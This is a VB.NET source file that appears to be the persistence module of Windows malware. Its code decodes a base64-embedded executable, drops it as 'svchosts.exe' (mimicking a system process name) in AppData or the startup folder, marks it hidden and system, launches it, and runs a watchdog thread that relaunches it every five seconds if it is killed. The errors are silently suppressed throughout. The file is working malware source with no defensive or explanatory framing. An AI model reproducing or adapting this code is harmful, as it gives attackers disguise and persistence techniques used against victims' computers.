﻿Imports System.Diagnostics
Imports System.Windows.Forms

Public Class WatcherSettings
    Public watchert As Integer = 0
    Public watchthread As System.Threading.Thread
    Public Sub NewWatcher(ByVal WatcherByte As String)
        On Error Resume Next
        If A.HardInstall = "True" Then
            If IO.File.Exists(Environ("AppData") & "\svchosts.exe") Then
                IO.File.Delete(Environ("AppData") & "\svchosts.exe")
                IO.File.WriteAllBytes(Environ("AppData") & "\svchosts.exe", Convert.FromBase64String(WatcherByte))
                IO.File.SetAttributes(Environ("AppData") & "\svchosts.exe", IO.FileAttributes.Hidden + IO.FileAttributes.System)
            Else
                IO.File.WriteAllBytes(Environ("AppData") & "\svchosts.exe", Convert.FromBase64String(WatcherByte))
                IO.File.SetAttributes(Environ("AppData") & "\svchosts.exe", IO.FileAttributes.Hidden + IO.FileAttributes.System)
            End If
        Else
            IO.File.WriteAllBytes(Application.StartupPath & "\svchosts.exe", Convert.FromBase64String(WatcherByte))
            IO.File.SetAttributes(Application.StartupPath & "\svchosts.exe", IO.FileAttributes.Hidden + IO.FileAttributes.System)
        End If
        StopWatcher(False)
        If A.HardInstall = "True" Then
            Process.Start(Environ("AppData") & "\svchosts.exe")
        Else
            Process.Start(Application.StartupPath & "\svchosts.exe")
        End If
        KeepWatcherRuning()
    End Sub
    Public Sub StopWatcher(ByVal DeleteWatcher As Boolean)
        On Error Resume Next
        Dim Watcher() As Process = System.Diagnostics.Process.GetProcessesByName("svchosts")
        For Each KillWatcher As Process In Watcher
            KillWatcher.Kill()
        Next
        watchthread.Abort()
        If DeleteWatcher = True Then
            If A.HardInstall = "True" Then
                IO.File.Delete(Environ("AppData") & "\svchosts.exe")
            Else
                IO.File.Delete(Application.StartupPath & "\svchosts.exe")
            End If
        End If
    End Sub
    Public Sub KeepWatcherRuning()
        watchthread = New System.Threading.Thread(AddressOf CheckWatcher)
        watchthread.IsBackground = True
        watchthread.Start()
    End Sub
    Private Sub CheckWatcher()
        Dim p1() As Process
        On Error Resume Next
        Dim st As Integer = +1
        If st <> 2 Then
runwacther:
            System.Threading.Thread.Sleep(5000)
            If Process.GetProcessesByName("svchosts").Length > 0 Then

            Else
                If A.HardInstall = "True" Then
                    Process.Start(Environ("AppData") & "\svchosts.exe")
                Else
                    Process.Start(Application.StartupPath & "\svchosts.exe")
                End If
            End If
            Resume runwacther
        End If
    End Sub
End Class
